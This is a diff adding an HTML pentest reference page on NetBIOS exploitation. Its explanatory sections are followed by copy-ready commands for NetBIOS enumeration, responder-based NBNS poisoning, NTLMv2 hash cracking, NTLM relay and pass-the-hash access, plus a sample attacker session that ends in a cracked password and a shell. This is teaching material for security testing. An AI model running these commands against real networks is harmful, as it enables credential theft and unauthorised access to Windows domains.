@@ -1,0 +1,182 @@
+<!-- Title -->
+<h1 class="text-2xl font-bold mb-2">NetBIOS Exploitation</h1>
+<p class="text-gray-300 mb-4">
+  Domain: <strong>Windows Networking</strong> • Focus: <strong>NetBIOS Abuse & Legacy Exploits</strong> • Last Updated: <strong>2025-09-05</strong>
+</p>
+
+<!-- Summary -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Summary</h2>
+  <p class="text-gray-300">
+    NetBIOS (Network Basic Input/Output System) is a legacy protocol suite used 
+    for Windows networking. Running over TCP/139 and UDP/137–138, NetBIOS enables 
+    name resolution, session services, and file/printer sharing. 
+    Attackers exploit NetBIOS to enumerate users and shares, poison name lookups 
+    (NBNS spoofing), capture or relay NTLM credentials, and pivot laterally 
+    into Windows environments. Although replaced by SMB over 445, NetBIOS 
+    remains a weak link in legacy networks.
+  </p>
+</section>
+
+<!-- Why Exploitable -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Why Exploitable</h2>
+  <ul class="list-disc ml-5 text-gray-200 space-y-2">
+    <li><strong>Legacy Protocol:</strong> Outdated but still enabled in many Windows domains.</li>
+    <li><strong>Unauthenticated Enum:</strong> Shares, users, and hostnames can be retrieved.</li>
+    <li><strong>NBNS Poisoning:</strong> Attackers can spoof responses to redirect traffic.</li>
+    <li><strong>Credential Theft:</strong> NTLM hashes leak via NetBIOS redirection.</li>
+    <li><strong>Lateral Movement:</strong> Weak shares enable file drops and pivoting.</li>
+  </ul>
+</section>
+
+<!-- How Exploitation Works -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">How Exploitation Works</h2>
+  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
+    <li><strong>Discovery:</strong> Identify UDP/137,138 and TCP/139 services.</li>
+    <li><strong>Enumeration:</strong> Extract NetBIOS names, users, and shares.</li>
+    <li><strong>Poisoning:</strong> Perform NBNS spoofing to redirect traffic.</li>
+    <li><strong>Credential Theft:</strong> Capture NTLMv2 hashes during name resolution.</li>
+    <li><strong>Exploitation:</strong> Access or drop files on shared resources, relay hashes for RCE.</li>
+  </ol>
+</section>
+
+<!-- Steps -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Steps</h2>
+  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
+    <li>Scan for NetBIOS services on UDP/137-138, TCP/139.</li>
+    <li>Enumerate NetBIOS names, users, and shares.</li>
+    <li>Conduct NBNS spoofing with responder.</li>
+    <li>Capture and relay NTLM hashes.</li>
+    <li>Access shares or escalate to domain compromise.</li>
+  </ol>
+</section>
+
+<!-- Commands -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Commands</h2>
+  <pre class="text-sm bg-gray-900 p-3 rounded overflow-x-auto">
+
+# ------------------------------
+# Discovery
+# ------------------------------
+nmap -p137-139 --script nbstat [target]
+nmblookup -A [target]
+
+# ------------------------------
+# Enumeration
+# ------------------------------
+nbtscan [target]/24
+smbclient -L //[target]/ -N
+enum4linux -a [target]
+
+# ------------------------------
+# NBNS Spoofing / Credential Capture
+# ------------------------------
+responder -I eth0 -wrf
+hashcat -m 5600 captured_hashes.txt rockyou.txt   # Crack NTLMv2
+
+# ------------------------------
+# Relay Attack
+# ------------------------------
+ntlmrelayx.py -tf targets.txt -smb2support
+impacket-smbclient -hashes [LM:NT] [user]@[target]
+
+# ------------------------------
+# Example Workflow
+# ------------------------------
+nmap -p137-139 --script nbstat 192.168.1.50
+nbtscan 192.168.1.0/24
+responder -I eth0
+hashcat -m 5600 responder_hashes.txt rockyou.txt
+    </pre>
+</section>
+
+<!-- Real-World Exploitation Walkthrough -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Real-World Exploitation Walkthrough</h2>
+  <details class="bg-gray-900 rounded p-3">
+    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
+      Click to expand attacker session
+    </summary>
+    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">
+
+[ saide ~ ]$ nmap -p137-139 --script nbstat 192.168.1.60
+PORT    STATE SERVICE
+137/udp open  netbios-ns
+138/udp open  netbios-dgm
+139/tcp open  netbios-ssn
+| nbstat:
+|   NetBIOS name: WIN-SERVER
+|   Workgroup: CORP
+|   MAC Address: 00:11:22:33:44:55
+
+[ saide ~ ]$ nbtscan 192.168.1.0/24
+192.168.1.60   WIN-SERVER     CORP    File Server Service
+
+[ saide ~ ]$ responder -I eth0 -wrf
+[+] Listening for NetBIOS Name Service requests...
+[+] Captured NTLMv2 hash for CORP\alice:
+   alice::CORP:1122334455667788:abcd1234ef567890:010100000000...
+
+[ saide ~ ]$ hashcat -m 5600 ntlm_hash.txt rockyou.txt
+[+] Password found: Summer2025!
+
+[ saide ~ ]$ impacket-smbclient -hashes aad3b435b51404eeaad3b435b51404ee:cc36cf7a8514893efccd332446158b1a alice@192.168.1.60
+C:\> whoami
+corp\alice
+    </pre>
+  </details>
+</section>
+
+<!-- Example Results -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Example Results</h2>
+  <details class="bg-gray-900 rounded p-3">
+    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
+      Click to view sample NetBIOS exploitation results
+    </summary>
+    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">
+
+# Service Discovery
+137/udp open  netbios-ns
+139/tcp open  netbios-ssn
+
+# Enumeration
+WIN-SERVER
+Workgroup: CORP
+MAC: 00:11:22:33:44:55
+
+# Captured Hash
+User: alice
+Hash: NTLMv2 → cracked → Summer2025!
+
+# Proof of Exploitation
+SMB access gained using captured NTLM creds
+    </pre>
+  </details>
+</section>
+
+<!-- References -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4">
+  <h2 class="text-lg font-semibold mb-2">References</h2>
+  <ul class="list-disc ml-5 text-gray-200">
+    <li>
+      <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-netbios" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        HackTricks – Pentesting NetBIOS
+      </a>
+    </li>
+    <li>
+      <a href="https://attack.mitre.org/techniques/T1557/001/" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        MITRE ATT&CK – LLMNR/NBT-NS Poisoning & Relay
+      </a>
+    </li>
+    <li>Red Team workflow: Discovery → Enum shares → NBNS spoofing → Hash capture → Relay → Domain pivot.</li>
+  </ul>
+</section>
